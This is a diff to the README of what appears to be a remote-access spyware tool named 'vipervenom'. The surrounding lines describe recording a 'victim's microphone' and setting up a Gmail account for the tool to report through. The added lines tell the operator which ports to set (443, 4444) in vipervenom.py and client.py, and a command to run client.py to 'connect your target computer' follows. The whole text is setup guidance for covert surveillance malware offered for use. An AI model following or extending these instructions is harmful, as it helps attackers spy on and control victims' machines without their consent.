@@ -57,6 +57,10 @@ an executable.
   For security reasons, open a new Gmail account, and enable "Less secure apps" in your account settings, use this [helpful arcticle](https://hotter.io/docs/email-accounts/secure-app-gmail/)
 * Line 48, recommeneded, if you ever wanted to record victim's microphone, you will need to set the amount of time to record, you won't be able to change this option after second in to the victim, please keep it in mind.
 
+#### Edit vipervenom.py file
+* Line 54, optional, default port: 443
+* Line 66, optional, probably keep it as it is, default port: 4444, if you will edit this, you will need to edit client.py, lines 26 and 29 to the same port.
+
 ##### To connect your target computer:
 ```
 $ Python3 client.py
